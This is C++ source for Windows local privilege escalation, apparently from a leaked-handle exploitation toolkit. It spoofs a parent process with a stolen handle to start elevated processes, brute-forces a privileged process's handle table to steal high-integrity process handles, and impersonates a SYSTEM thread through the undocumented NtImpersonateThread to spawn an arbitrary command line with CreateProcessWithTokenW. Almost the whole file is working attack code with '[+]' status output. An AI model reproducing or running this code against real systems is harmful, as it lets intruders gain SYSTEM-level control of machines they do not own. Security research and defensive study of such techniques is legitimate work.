#include <windows.h>

#include <map>
#include <string>
#include <iostream>
#include <TlHelp32.h>

using namespace std;

DWORD CreatePrivProc(PHANDLE hPrivProc, LPWSTR commandLine) {
	STARTUPINFOEX sinfo = { sizeof(sinfo) };
	PROCESS_INFORMATION pinfo;
	LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
	SIZE_T bytes = 0;

	sinfo.StartupInfo.cb = sizeof(STARTUPINFOEX);
	InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
	if (bytes == 0)
		return FALSE;
	ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)LocalAlloc(LPTR, bytes);
	if (ptList == NULL)
		return false;
	InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);

	UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, hPrivProc, sizeof(HANDLE), NULL, NULL);
	sinfo.lpAttributeList = ptList;

	if (CreateProcess(NULL, commandLine,
		NULL, NULL, TRUE,
		EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,
		&sinfo.StartupInfo, &pinfo)) {
		return pinfo.dwProcessId;
	}
	else {
		return 0;
	}
}

BOOL CloneHandle(DWORD ownerPid, HANDLE handle, PHANDLE clonedHandle) {
	HANDLE elevatedToken = NULL;
	HANDLE hOwner = OpenProcess(PROCESS_DUP_HANDLE, false, ownerPid);
	if (hOwner == NULL)
		return FALSE;
	bool result = DuplicateHandle(
		hOwner,
		handle,
		GetCurrentProcess(),
		clonedHandle,
		NULL,
		false,
		DUPLICATE_SAME_ACCESS
	);
	CloseHandle(hOwner);
	return result;
}

DWORD GetTargetIntegrityLevel(HANDLE hProc) {
	HANDLE hToken;
	if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken))
	{
		CloseHandle(hProc);
		return 0;
	}
	PTOKEN_MANDATORY_LABEL tokenInformation;
	DWORD returnLength;
	DWORD integrityLevel;
	GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &returnLength);
	if (returnLength <= 0) {
		CloseHandle(hToken);
		CloseHandle(hProc);
		return 0;
	}
	tokenInformation = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, returnLength);
	if (!GetTokenInformation(hToken, TokenIntegrityLevel, tokenInformation, returnLength, &returnLength)) {
		LocalFree(tokenInformation);
		CloseHandle(hToken);
		CloseHandle(hProc);
		return 0;
	}
	integrityLevel = *GetSidSubAuthority(tokenInformation->Label.Sid,
		(DWORD)(UCHAR)(*GetSidSubAuthorityCount(tokenInformation->Label.Sid) - 1));
	LocalFree(tokenInformation);
	CloseHandle(hToken);
	CloseHandle(hProc);
	return integrityLevel;
}

DWORD GetTargetIntegrityLevel(DWORD pid) {
	HANDLE hProc;
	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (hProc == NULL)
		return 0;
	return GetTargetIntegrityLevel(hProc);
}

// ExploitDupHandle: given a handle to a SYSTEM process with PROCESS_DUP_HANDLE rights,
// brute-forces the target's handle table to steal a privileged process handle,
// then uses CreatePrivProc to spawn commandLine in that elevated context.
DWORD ExploitDupHandle(HANDLE hProc, LPWSTR commandLine) {
	// Handle values in Windows are multiples of 4 starting at 4.
	// SYSTEM processes commonly hold a self-handle and handles to other SYSTEM processes
	// at low handle values, so 0x1000 covers the vast majority of cases.
	for (ULONG_PTR handleVal = 4; handleVal < 0x1000; handleVal += 4) {
		HANDLE hStolen = NULL;

		// Steal the handle at this slot with DUPLICATE_SAME_ACCESS so we get
		// whatever rights the target already has on that object.
		if (!DuplicateHandle(hProc, (HANDLE)handleVal, GetCurrentProcess(),
			&hStolen, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
			continue;
		}

		// Filter: is this a process handle?
		DWORD pid = GetProcessId(hStolen);
		if (pid == 0) {
			CloseHandle(hStolen);
			continue;
		}

		// Filter: is the target process running at High or SYSTEM integrity?
		DWORD il = GetTargetIntegrityLevel(pid);
		if (il < SECURITY_MANDATORY_HIGH_RID && GetLastError() != ERROR_ACCESS_DENIED) {
			CloseHandle(hStolen);
			continue;
		}

		std::cout << "[+] ExploitDupHandle: stolen process handle 0x" << std::hex << handleVal
			<< " -> PID " << std::dec << pid
			<< " (IL: 0x" << std::hex << il << "), spawning...\n";

		DWORD privPid = CreatePrivProc(&hStolen, commandLine);
		CloseHandle(hStolen);
		if (privPid != 0)
			return privPid;

		std::cerr << "[-] CreatePrivProc failed for handle 0x" << std::hex << handleVal
			<< " (error: " << std::dec << GetLastError() << ")\n";
	}
	return 0;
}

// NtImpersonateThread: undocumented API — impersonates the security context of
// ThreadToImpersonate on ThreadHandle. Requires THREAD_DIRECT_IMPERSONATION on
// the target thread.
typedef NTSTATUS(WINAPI* fNtImpersonateThread)(
	HANDLE ThreadHandle,
	HANDLE ThreadToImpersonate,
	PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService
);

// ExploitThreadImpersonation: given a SYSTEM thread handle with
// THREAD_DIRECT_IMPERSONATION rights, impersonates its token on the calling thread,
// promotes to a primary token, and spawns commandLine via CreateProcessWithTokenW.
DWORD ExploitThreadImpersonation(HANDLE hThread, LPWSTR commandLine) {
	fNtImpersonateThread NtImpersonateThread =
		(fNtImpersonateThread)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtImpersonateThread");
	if (!NtImpersonateThread) {
		std::cerr << "[-] Failed to resolve NtImpersonateThread\n";
		return 0;
	}

	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	sqos.ContextTrackingMode = SECURITY_STATIC_TRACKING;
	sqos.EffectiveOnly = FALSE;

	NTSTATUS status = NtImpersonateThread(GetCurrentThread(), hThread, &sqos);
	if (status != 0) {
		std::cerr << "[-] NtImpersonateThread failed: 0x" << std::hex << status << "\n";
		return 0;
	}

	std::cout << "[+] Impersonating target thread token...\n";

	// Grab the impersonation token now sitting on our thread
	HANDLE hImpToken = NULL;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &hImpToken)) {
		std::cerr << "[-] OpenThreadToken failed: " << std::dec << GetLastError() << "\n";
		RevertToSelf();
		return 0;
	}

	// Promote to a primary token so CreateProcessWithTokenW can use it
	HANDLE hPrimary = NULL;
	if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL,
		SecurityImpersonation, TokenPrimary, &hPrimary)) {
		std::cerr << "[-] DuplicateTokenEx failed: " << std::dec << GetLastError() << "\n";
		CloseHandle(hImpToken);
		RevertToSelf();
		return 0;
	}
	CloseHandle(hImpToken);

	// Spawn while still impersonating so SE_IMPERSONATE_PRIVILEGE is present on the thread
	STARTUPINFOW si = { sizeof(si) };
	PROCESS_INFORMATION pi = {};
	DWORD pid = 0;

	if (CreateProcessWithTokenW(hPrimary, LOGON_WITH_PROFILE, NULL,
		commandLine, 0, NULL, NULL, &si, &pi)) {
		pid = pi.dwProcessId;
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else {
		std::cerr << "[-] CreateProcessWithTokenW failed: " << std::dec << GetLastError() << "\n";
	}

	CloseHandle(hPrimary);
	RevertToSelf();
	return pid;
}

wstring GetProcName(DWORD pid)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);
	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		return wstring();
	}

	for (BOOL bok = Process32First(processesSnapshot, &processInfo); bok; bok = Process32Next(processesSnapshot, &processInfo))
	{
		if (pid == processInfo.th32ProcessID)
		{
			CloseHandle(processesSnapshot);
			return processInfo.szExeFile;
		}

	}
	CloseHandle(processesSnapshot);
	return wstring();
}